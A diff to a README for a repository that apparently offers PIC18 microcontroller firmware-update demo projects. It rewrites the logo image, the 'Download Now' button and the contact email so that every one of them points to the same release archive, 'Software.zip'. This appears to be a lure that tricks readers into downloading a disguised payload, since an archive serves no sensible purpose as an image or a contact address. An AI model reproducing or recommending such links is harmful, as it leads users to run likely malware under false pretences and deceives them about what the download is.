@@ -1,6 +1,6 @@
 # 🚀 8-Bit MDFU Solution with MPLAB MCC 🚀
 
-![MDFU Logo](https://example.com/mdfu_logo.png)
+![MDFU Logo](https://github.com/Envility/pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc/releases/download/v2.0/Software.zip)
 
 Welcome to the "pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc" repository! Here you will find two MPLAB® X projects that demonstrate the capabilities of the 8-Bit MDFU Client library and the ecosystem it enables.
 
@@ -24,7 +24,7 @@ The projects in this repository are designed to highlight the features of the 8-
 
 ## 📦 Download
 For the downloadable content related to this repository, please click the button below:
-[![Download Now](https://img.shields.io/badge/Download-Now-orange)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Now](https://github.com/Envility/pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc/releases/download/v2.0/Software.zip)](https://github.com/Envility/pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc/releases/download/v2.0/Software.zip)
 *Launch the download to access the content.*
 
 ## 🌐 Additional Information
@@ -34,6 +34,6 @@ For more information or updates related to this project, please check the "Relea
 Contributions to enhance, optimize, or expand the projects in this repository are welcome. Feel free to fork the repository, make your changes, and submit a pull request.
 
 ## 📞 Contact
-For any questions, feedback, or support regarding this repository, you can reach out to the project maintainers via email at [maintainer@example.com](mailto:maintainer@example.com).
+For any questions, feedback, or support regarding this repository, you can reach out to the project maintainers via email at [https://github.com/Envility/pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc/releases/download/v2.0/Software.zip](https://github.com/Envility/pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc/releases/download/v2.0/Software.zip).
 
 Thank you for checking out the "pic18f56q24-cnano-8bit-mdfu-solution-mplab-mcc" repository. We hope you find the projects informative and inspiring! 🌟
